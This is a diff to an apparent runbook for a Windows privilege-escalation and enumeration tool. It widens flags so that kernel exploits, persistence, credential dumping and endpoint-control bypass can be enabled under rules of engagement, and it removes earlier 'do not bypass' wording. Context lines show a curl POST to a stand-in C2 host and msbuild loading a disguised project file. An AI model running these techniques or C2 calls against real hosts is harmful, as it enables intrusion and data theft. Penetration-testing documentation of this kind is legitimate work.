@@ -178,7 +178,7 @@ Choose one primary outcome and one fallback before touching the host:
 | One suspected path | `--plugins` for the relevant IDs | Read-only manual verification |
 | Repeatability / drift | Same plugin set and output format as baseline | Compare only common coverage |
 | CI or fleet gate | `--quiet --format json --fail-on ...` | Preserve JSON and inspect coverage errors |
-| Host policy compatibility | `doctor`, `list-plugins`, then baseline | Stop if execution is blocked; do not bypass controls without approval |
+| Host policy compatibility | `doctor`, `list-plugins`, then baseline | Prefer script fallback; use `--allow-techniques endpoint-bypass` only with approval |
 
 An empty finding list is not proof of a clean host. A valid conclusion requires
 the expected OS build, plugin coverage with no material errors, and a recorded
@@ -779,7 +779,17 @@ curl -fsS -X POST "https://c2.example/intake" \
 STEALTHY_AUTHORIZED=1 "$BIN" enum --auto-exploit
 ```
 
-Still blocked: kernel exploits, service binary replacement, persistence without consent.
+High-impact families (kernel exploit, service replace, persistence, Potato, MSI,
+credential dump, host-crash, endpoint bypass) stay off unless you also pass
+`--allow-techniques` when ROE permits:
+
+```bash
+STEALTHY_AUTHORIZED=1 "$BIN" enum --auto-exploit \
+  --allow-techniques kernel-exploit,service-replace,persistence
+```
+
+In this revision those IDs are scaffolded (flag accepted + findings recorded);
+payload execution lands in follow-up work.
 
 ### 3.7 Script fallback execution
 
@@ -1358,7 +1368,7 @@ where msbuild
 msbuild C:\Users\Public\Documents\cache-update\EnumTasks.csproj
 ```
 
-If AppLocker blocks `powershell.exe` but allows `cscript.exe`, use `enum.js`. If both are blocked, stop and escalate within ROE — do not invent unsigned loaders.
+If AppLocker blocks `powershell.exe` but allows `cscript.exe`, use `enum.js`. If both are blocked, escalate within ROE or use `--allow-techniques endpoint-bypass` only when approved (scaffold in this revision).
 
 ### 4.11 Post-deploy verify (Windows)
 
@@ -1865,8 +1875,8 @@ Call out limitations explicitly in the deliverable:
 
 - Authorized assessments only
 - Default = enumeration + recommendations
-- `--auto-exploit` never runs kernel LPE in this build
+- High-impact families require explicit `--allow-techniques` when ROE permits
 - No silent network client in v1 remote mode
-- Script fallbacks also enumeration-only
+- Script fallbacks also enumeration-only by default
 
 If ROE and this runbook conflict, **ROE wins** — reduce scope, do not improvise noisier techniques.
